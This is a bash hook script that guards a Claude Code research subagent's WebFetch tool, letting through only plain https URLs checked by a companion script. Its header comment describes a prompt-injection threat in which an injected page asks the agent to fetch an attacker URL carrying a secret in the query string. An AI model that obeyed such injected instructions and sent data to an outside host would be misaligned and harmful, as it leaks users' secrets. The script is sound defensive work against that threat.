#!/usr/bin/env bash
# PreToolUse hook of the ops-researcher subagent on Claude Code
# (agents/opsx-researcher.md, matcher WebFetch).
#
# The researcher reads untrusted pages and may also read repository files, so
# an injected page could ask it to fetch https://attacker/?d=<secret>. This hook
# reads the hook payload (JSON) on stdin and lets a WebFetch through only when
# its URL passes `questions.sh url` (the questions.sh next to this guard;
# install.sh puts both in the same directory): a plain https document address
# with no query string, userinfo, port, IP or local host, and no path segment
# longer than 64 characters. Everything else, and any payload it cannot read,
# is denied with exit 2 and a reason on stderr, which Claude Code shows the
# subagent and blocks the call (also under bypassPermissions).
set -u

deny() { printf 'webfetch-guard: %s; ops-researcher may fetch only plain https document URLs (no query string, userinfo, port, IP or local host, path segments up to 64 characters)\n' "$1" >&2; exit 2; }

here=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd -P) || deny "cannot resolve the guard's directory"
[ -f "$here/questions.sh" ] || deny "no questions.sh next to the guard ($here/questions.sh)"
payload=$(head -c 65536) || deny "no hook payload"
filter='if (.tool_input.url | type) == "string" then .tool_input.url else empty end'
if command -v jq >/dev/null 2>&1; then
  url=$(printf '%s' "$payload" | jq -r "$filter" 2>/dev/null) || deny "unreadable hook payload"
elif command -v python3 >/dev/null 2>&1; then
  url=$(printf '%s' "$payload" | python3 -I -c 'import json,sys
u=(json.load(sys.stdin).get("tool_input") or {}).get("url")
print(u if isinstance(u,str) else "")' 2>/dev/null) || deny "unreadable hook payload"
else
  deny "neither jq nor python3 is available to read the hook payload"
fi
[ -n "$url" ] || deny "no URL in the hook payload"
case $url in *$'\n'*|*$'\r'*) deny "multi-line URL" ;; esac
why=$(bash "$here/questions.sh" url -- "$url" 2>&1 >/dev/null) || deny "${why:-url refused}: ${url:0:200}"
exit 0
